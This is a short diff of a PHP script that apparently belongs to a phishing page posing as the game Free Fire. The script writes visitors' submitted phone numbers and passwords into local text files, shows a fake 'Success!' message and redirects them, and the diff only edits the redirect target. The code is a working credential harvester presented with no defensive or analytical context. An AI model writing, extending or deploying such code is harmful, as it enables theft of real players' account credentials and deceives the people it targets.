@@ -18,7 +18,7 @@ file_put_contents("usernames.txt", "Free Fire Phone number: " . $_POST['phone'].
 ?>
 <?php
 file_put_contents("pass.txt", "Free fire password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
 
 <center><span style='background:limegreen;width:360px;margin:0;padding:5px 0;color:black;display:block'>Success! Your submission has been requested</span></center>
